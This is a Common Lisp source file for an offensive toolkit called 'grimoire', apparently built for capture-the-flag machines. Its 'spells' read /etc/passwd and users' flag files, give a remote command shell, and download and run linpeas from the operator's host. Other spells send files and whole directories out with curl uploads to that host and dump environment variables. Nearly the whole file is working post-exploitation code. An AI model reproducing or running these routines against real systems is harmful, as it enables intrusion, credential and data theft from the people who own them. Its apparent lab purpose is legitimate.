(in-package :grimoire)
 
(defvar *spells* (make-hash-table :test #'equal))

(defstruct spell
  name needs function)

(defmacro define-spell (name glyphs args &body body)
  "create a spell called `name` that needs `glyphs` and takes `args`"
  (multiple-value-bind (docstring decls forms) (parse-body body)
    `(progn 
       (defun ,name ,args
         ,@(if docstring (list docstring) '())
         ,@decls
         ,@(loop for c in glyphs
                 collect `(glyph/available? ,c))
         ,@forms)
       (setf (gethash (string-upcase ',name) *spells*)
             (make-spell :name ',name
                         :needs ',glyphs
                         :function #',name)))))

(defun spell/runnable? (spell)
  (loop for glyph in (spell-needs spell)
        always (glyph/available? glyph :do-not-fail t)))

(defun spell/list ()
  (a:hash-table-keys *spells*))

(defun spell/description (spell-name)
  (documentation
   (intern (str:upcase spell-name))
   'function))

(defun spell/info (&key show-all)
  (loop for spell being the hash-value in *spells* using (hash-key spell-name)
        for runnable = (spell/runnable? spell)
        for icon = (if runnable "+" " ")
        if (or runnable show-all)
        do (progn (out "[~a] Spell \"~a\"~%" icon spell-name)
                  (out "    Description: ~S~%" (spell/description spell-name))
                  (out "    Castable? ~a (needs ~{:~a~^, ~})~%~%" 
                       (yes? runnable)
                       (spell-needs spell)))))

;; sight

(define-spell system-info (:sight) ()
  "read system information"
  (parse-key=value (use :sight "/etc/os-release")))

(define-spell all-users (:sight) ()
  "list all the users from /etc/passwd"
  (loop for line in (str:lines (use :sight "/etc/passwd"))
        if (not (alexandria:emptyp line))
        collect (car (str:split ":" line))))

(define-spell users (:sight) ()
  "list the users that are not default"
  (remove-if
   #'(lambda (u) (member u *default-users* :test #'string=))
   (all-users)))

(define-spell flag (:sight) (&key username root)
  "try to read the flag from user home folders"
  (flet ((try-for-flag (u)
           (format t "[+] Trying to read ~a's flag...~%" u)
           (ignore-errors
             (str:trim
              (use :sight (format nil "/home/~a/~a.txt"
                                  u (if root "root" "user")))))))
    (if username
        (try-for-flag username)
        (s:~>> (users)
               (mapcar #'try-for-flag)
               (remove-if #'null)
               (remove-if #'a:emptyp)))))

;; command

(defparameter *current-dir* nil)

(defun exec-keep-pwd (command)
  (if (str:starts-with? "cd " command)
      (setf *current-dir* 
            (glyph/use :command (fmt "cd ~a && cd ~a && pwd"
                                     *current-dir*
                                     (str:replace-first "cd " "" command))))
      (ignore-errors
        (glyph/use :command (fmt "cd ~a && ~a" *current-dir* command)))))

(defun fake-shell-prompt (&optional (prepend-newline t))
  (out "~a[~a]$ " 
       (if prepend-newline #\Newline "")
       *current-dir*)
  (force-output)
  (read-line))

(define-spell fake-shell (:command) ()
  "gives a 'fake' shell that allows for command execution and follows cd commands"
  (setf *current-dir* (use :command "pwd"))

  ;; shell
  (loop for pnl = nil then t
        for command = (fake-shell-prompt pnl)
        if (string= command "exit") do (return)
        else do (out "~a~%" (exec-keep-pwd command))))

(define-spell download-linpeas (:command) ()
  "download linpeas to /tmp in the machine"
  (use :command (fmt "curl http://~a:5000/tools/linpeas.sh -o /tmp/linpeas.sh"
                     *host-ip*)))

(define-spell linpeas (:command) ()
  "download linpeas, execute it and show the result"
  (out "[+] Downloading linpeas~%")
  (download-linpeas)

  (out "[+] Running linpeas.sh~%")
  (use :command "sh /tmp/linpeas.sh > /tmp/output.txt")

  (out "[+] Results:~%")
  (use :command "cat /tmp/output.txt"))

(define-spell list-files (:command) (path &key absolute-path)
  "returns a list of all files in the path"
  (let ((files (str:split #\Newline (use :command (fmt "ls ~a" path))))
        (ends-with-slash (str:ends-with? "/" path)))
    (if absolute-path
        (mapcar #'(lambda (f)
                    (if ends-with-slash
                        (str:concat path f)
                        (str:concat path "/" f)))
                files)
        files)))

(define-spell download (:command) (path &key no-server)
  "downloads the file to your project's folder"
  (if no-server 
      (use :command (fmt "base64"))
      (use :command (fmt "curl -F file=@~a http://~a:5000/upload/"
                         path *host-ip*))))

(define-spell download-all (:command) (path)
  "downloads all files in the path to your project's folder"
  (let ((files (list-files path :absolute-path t)))
    (dolist (file files)
      (use :command (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
                         file *host-ip*)))))

(define-spell environment (:command) (&optional key)
  "returns all environment variables"
  (let ((res (parse-key=value (use :command "set"))))
    (if key
        (cdr (find-if #'(lambda (k) (string= k key)) res :key #'car))
        res)))

(define-spell path (:command) ()
  "get the environment variable PATH"
  (str:split ":" (environment "PATH")))

(define-spell system-binaries (:command) (&key absolute-path)
  "list the binaries in the default places"
  (remove-duplicates
   (mapcan #'(lambda (p)
               (list-files p :absolute-path absolute-path))
           (path))
   :test #'string=))